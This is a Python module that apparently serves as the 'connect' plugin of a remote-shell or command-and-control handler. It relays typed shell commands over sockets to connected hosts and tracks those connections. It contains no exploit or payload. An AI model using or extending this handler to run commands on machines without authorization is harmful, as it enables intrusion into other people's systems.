import socket
import time
import sys
from colorama import Fore, init

if sys.platform == 'win32' or sys.platform == 'win64':
    init(convert=True)

description = 'sdf'
cmdstring = 'connect'
args = ''
error = ''

connections = []
addresses = []
hostnames = []

s = None

def send_commands(conn, index):
    conn.send(str.encode('\n'))
    print(recieve_immediately(conn),end='')
    while(True):
        try:
            cmd = input()
            if cmd == 'quit' or cmd == 'exit':
                print(Fore.LIGHTYELLOW_EX + '[+] Ending interaction with ' + str(addresses[index][0]) + Fore.RESET)
                break
            elif cmd == '':
                conn.send(str.encode('\n'))
                print(recieve(conn), end='')
            elif cmd == 'goodmorning':
                conn.send(str.encode('echo hey there man!\n'))
                print(recieve(conn), end='')
            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd + '\n'))
                print(recieve(conn), end='')
        except:
            conn.send(str.encode('exit\n')) 
            conn.close()              
            del connections[index]
            del addresses[index]
            del hostnames[index]
            print(Fore.LIGHTRED_EX + '[!] Connection was lost!' + error + Fore.RESET)
            break

def recieve(conn, timeout=0.1):
    res = ''
    begin=time.time()

    while True:
        if (len(res) > 0) and (time.time()-begin) > timeout:
            break
        #wait up to five seconds for a command 
        elif time.time()-begin > timeout * 50:
            print(Fore.LIGHTRED_EX + '[!] Command appears to be frozen. Wait and press enter if you think the command should still go through otherwise try reopening a new connection.' + error + Fore.RESET)
            break
        else:
            try:
                data = conn.recv(1024)
                begin = time.time()
                res += data.decode('utf-8')
            except:
                pass
    return res

def recieve_immediately(conn):
    res = ''
    begin=time.time()
    timeout = 0.1

    while True:
        if time.time()-begin > timeout:
            break

        else:
            try:
                data = conn.recv(1024)
                begin = time.time()
                res += data.decode('utf-8')
            except:
                pass
    return res
